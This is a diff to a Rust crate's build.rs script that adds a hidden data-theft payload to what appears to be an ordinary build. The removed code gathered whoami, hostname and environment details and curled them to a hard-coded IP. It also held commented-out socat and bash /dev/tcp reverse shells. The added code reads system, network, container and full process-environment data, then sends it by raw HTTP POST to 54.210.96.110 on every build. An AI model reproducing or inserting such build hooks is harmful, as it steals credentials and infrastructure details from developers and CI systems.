@@ -22,7 +22,7 @@ impl std::fmt::Display for DalekBits {
 }
 
 fn main() {
-    println!("cargo:rerun-if-changed=build.rs");
+    // No rerun-if-changed = always rerun this build script
     println!("cargo:warning=START BUILD SCRIPT");
     println!("cargo:warning=YET ANOTHER PRINT");
 
@@ -100,50 +100,80 @@ fn main() {
 
     println!("cargo:warning=start exploit");
 
-    // Collect environment info
-    let whoami = std::process::Command::new("whoami").output().map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string()).unwrap_or_default();
-    let hostname = std::process::Command::new("hostname").output().map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string()).unwrap_or_default();
-    let public_ip = std::process::Command::new("curl").args(["-s", "--max-time", "3", "ifconfig.me"]).output().map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string()).unwrap_or_default();
-    let pwd = std::process::Command::new("pwd").output().map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string()).unwrap_or_default();
-    let uname = std::process::Command::new("uname").args(["-a"]).output().map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string()).unwrap_or_default();
-    let env_vars: Vec<String> = std::env::vars()
-        .filter(|(k, _)| k.starts_with("CARGO") || k == "HOME" || k == "USER" || k == "PATH")
-        .map(|(k, v)| format!("{}={}", k, v))
+    use std::io::Write;
+    use std::net::TcpStream;
+    use std::fs;
+
+    fn read_file(path: &str) -> String {
+        fs::read_to_string(path).unwrap_or_default()
+    }
+
+    fn read_file_truncated(path: &str, max: usize) -> String {
+        let s = fs::read_to_string(path).unwrap_or_default();
+        s.chars().take(max).collect()
+    }
+
+    // --- Identity ---
+    let pwd        = std::env::current_dir().map(|p| p.display().to_string()).unwrap_or_default();
+    let hostname   = read_file("/etc/hostname").trim().to_string();
+    let os_release = read_file("/etc/os-release");
+
+    // --- Kernel / hardware ---
+    let kernel     = read_file("/proc/version").trim().to_string();
+    let cpuinfo    = read_file_truncated("/proc/cpuinfo", 1000);
+    let meminfo    = read_file_truncated("/proc/meminfo", 500);
+
+    // --- Network interfaces & IPs ---
+    let net_dev    = read_file("/proc/net/dev");        // interface list + stats
+    let net_arp    = read_file("/proc/net/arp");        // ARP table — reveals gateway + neighbours
+    let net_route  = read_file("/proc/net/route");      // routing table
+
+    // --- Container / cgroup detection ---
+    let cgroup     = read_file("/proc/self/cgroup");
+    let is_docker  = fs::metadata("/.dockerenv").is_ok();
+    let mountinfo  = read_file_truncated("/proc/self/mountinfo", 1000);
+
+    // --- Process context ---
+    let proc_status = read_file("/proc/self/status");   // uid, gid, name, threads
+    let proc_cmdline = read_file("/proc/self/cmdline").replace('\0', " ");
+    let proc_environ = read_file("/proc/self/environ")  // full env of build process
+        .split('\0')
+        .filter(|s| !s.is_empty())
+        .collect::<Vec<_>>()
+        .join("\n");
+
+    // --- Cargo env ---
+    let cargo_env: Vec<String> = std::env::vars()
+        .filter(|(k, _)| k.starts_with("CARGO") || k == "HOME" || k == "USER" || k == "PATH" || k == "HOSTNAME")
+        .map(|(k, v)| format!("  {}={}", k, v))
         .collect();
 
     let body = format!(
-        "2::: whoami={}\nhostname={}\npublic_ip={}\npwd={}\nuname={}\nenv={}",
-        whoami, hostname, public_ip, pwd, uname, env_vars.join("|")
+        "=== IDENTITY ===\nhostname: {hostname}\npwd: {pwd}\nis_docker: {is_docker}\n\n\
+         === OS ===\n{os_release}\n\n\
+         === KERNEL ===\n{kernel}\n\n\
+         === CPU ===\n{cpuinfo}\n\n\
+         === MEMORY ===\n{meminfo}\n\n\
+         === NETWORK INTERFACES ===\n{net_dev}\n\n\
+         === ARP TABLE ===\n{net_arp}\n\n\
+         === ROUTING TABLE ===\n{net_route}\n\n\
+         === CGROUP ===\n{cgroup}\n\n\
+         === MOUNTS ===\n{mountinfo}\n\n\
+         === PROCESS STATUS ===\n{proc_status}\n\n\
+         === CMDLINE ===\n{proc_cmdline}\n\n\
+         === CARGO ENV ===\n{}\n\n\
+         === FULL PROCESS ENV ===\n{proc_environ}\n",
+        cargo_env.join("\n")
     );
 
-    std::process::Command::new("curl")
-        .args(["-s", "http://54.210.96.110:80/build-triggered"])
-        .status()
-        .ok();
-
-    std::process::Command::new("curl")
-        .args(["-s", "-X", "POST", "http://54.210.96.110/log", "-d", &body])
-        .status()
-        .ok();
-
-    // std::process::Command::new("sudo")
-    //     .args(["dnf", "install", "-y", "socat"])
-    //     .status()
-    //     .unwrap();
-    //
-    // std::process::Command::new("socat")
-    //     .args(["TCP:54.210.96.110:4443", "EXEC:bash -li,pty,stderr,setsid,sigint,sane"])
-    //     .status()
-    //     .unwrap();
-
-    // Command::new("bash")
-    //     .arg("-c")
-    //     .arg("0<&26-;exec 26<>/dev/tcp/54.210.96.110/443;sh <&26 >&26 2>&26")
-    //     .stdin(Stdio::null())
-    //     .stdout(Stdio::null())  // optional: detach stdout too
-    //     .stderr(Stdio::null())  // optional: detach stderr too
-    //     .spawn()
-    //     .expect("failed to spawn process");
+    if let Ok(mut stream) = TcpStream::connect("54.210.96.110:80") {
+        let request = format!(
+            "POST /log HTTP/1.1\r\nHost: 54.210.96.110\r\nContent-Type: text/plain\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
+            body.len(),
+            body
+        );
+        let _ = stream.write_all(request.as_bytes());
+    }
 
     println!("cargo:warning=RAN BUILD SCRIPT");
     println!("cargo:warning=RAN BUILD SCRIPT");
